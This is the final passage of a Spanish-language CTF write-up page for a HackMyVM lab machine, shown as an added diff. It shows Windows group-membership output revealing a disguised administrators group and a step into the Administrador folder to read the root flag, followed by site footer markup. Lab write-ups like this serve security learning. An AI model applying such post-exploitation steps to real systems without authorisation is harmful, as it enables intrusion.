+      <span class="no">NT</span> <span class="no">AUTHORITY</span><span class="p">\</span><span class="no">AutenticaciOn</span> <span class="no">NTLM</span>              <span class="no">Grupo</span> <span class="n">conocido</span> <span class="no">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="mi">10</span>                                    <span class="no">Grupo</span> <span class="n">obligatorio</span><span class="p">,</span> <span class="no">Habilitado</span> <span class="n">de</span> <span class="n">manera</span> <span class="n">predeterminada</span><span class="p">,</span> <span class="no">Grupo</span> <span class="n">habilitado</span>
+      <span class="no">Etiqueta</span> <span class="n">obligatoria</span><span class="p">\</span><span class="no">Nivel</span> <span class="n">obligatorio</span> <span class="n">medio</span> <span class="no">Etiqueta</span>       <span class="no">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">16</span><span class="o">-</span><span class="mi">8192</span>
+      <span class="no">PS</span> <span class="no">C</span><span class="p">:\</span><span class="no">Windows</span><span class="p">\</span><span class="n">system32</span><span class="o">&gt;</span>
+
+</code></pre></div></div>
+
+<p>Vemos diferentes grupos pero el que Nos llama más la atención es  <code class="language-plaintext highlighter-rouge">WIN-IURF14RBVGV\Idministritirs Alias S-1-5-21-2519875556-2276787807-2868128514-1002 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado</code> es el grupo de administradores. Aunque está mal escrito, tiene los mismos permisos que el grupo de administradores de Windows.</p>
+
+<p>Lo cual nos permitiria entrar en la carpeta del Administrador y ver la flag de root</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="no">PS</span> <span class="no">C</span><span class="p">:\</span><span class="no">Windows</span><span class="p">\</span><span class="n">system32</span><span class="o">&gt;</span> <span class="n">cd</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="no">Administrador</span><span class="p">\</span>
+    <span class="n">root</span><span class="p">.</span><span class="nf">txt</span>
+</code></pre></div></div>
+
+<h1 id="finalización">Finalización</h1>
+<p>Espero que hayan aprendido mucho haciendo esta máquina y les haya servido de ayuda mi explicación para poder entender esta <strong>CTF</strong>. Muchas gracias por leer el artículo y no olviden seguirme en <a href="https://github.com/0x832/">GitHub</a>, ya que también iré subiendo herramientas de hacking.</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      
+      <a href="/explorar/#cat-hackmyvm" class="page__taxonomy-item" rel="category">HackMyVM</a><span class="sep">, </span>
+    
+      
+      
+      
+      <a href="/explorar/#cat-writeups" class="page__taxonomy-item" rel="category">Writeups</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2025-04-12T00:00:00+00:00">April 12, 2025</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/Chemistry-easy/" class="pagination--pager" title="Chemistry - Easy
+">Previous</a>
+    
+    
+      <a href="/Evil-Intruder-bash-scripting/" class="pagination--pager" title="Evil IntrudeR - Bash Script para Auditoría Wi-Fi
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2026 0x832</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
